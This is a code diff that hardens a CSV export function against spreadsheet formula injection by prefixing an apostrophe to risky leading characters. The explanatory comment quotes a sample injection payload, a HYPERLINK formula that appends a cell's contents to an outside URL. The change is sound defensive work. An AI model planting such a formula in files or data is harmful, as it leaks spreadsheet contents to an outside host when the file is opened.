@@ -109,10 +109,23 @@ export async function fetchCollection(projectId, collection) {
 
 // ── CSV ───────────────────────────────────────────────────────────────────────
 
-/** `starters` is a comma-joined name list, so quoting here is load-bearing. */
+/**
+ * `starters` is a comma-joined name list, so quoting here is load-bearing.
+ *
+ * The leading-quote guard is a SEPARATE concern and CSV quoting does not cover
+ * it: Excel and Sheets strip the quotes at parse and then evaluate any cell
+ * that opens with = + - @ (or a tab/CR) as a formula. Every string column in
+ * this export — teamName, coachName, starters — arrives from a world-readable,
+ * world-WRITABLE public collection, so `=HYPERLINK("http://…"&A1,"Click")` in
+ * a 30-character team name is a live link the moment the operator opens the
+ * file. Prefixing an apostrophe is the standard defusal: spreadsheets read it
+ * as "this cell is text" and drop it, and every other CSV reader sees one
+ * extra character on a field that was already free-form.
+ */
 export function csvCell(value) {
   if (value === null || value === undefined) return '';
-  const s = String(value);
+  let s = String(value);
+  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
   return /[",\n]/.test(s) ? `"${s.replaceAll('"', '""')}"` : s;
 }
 
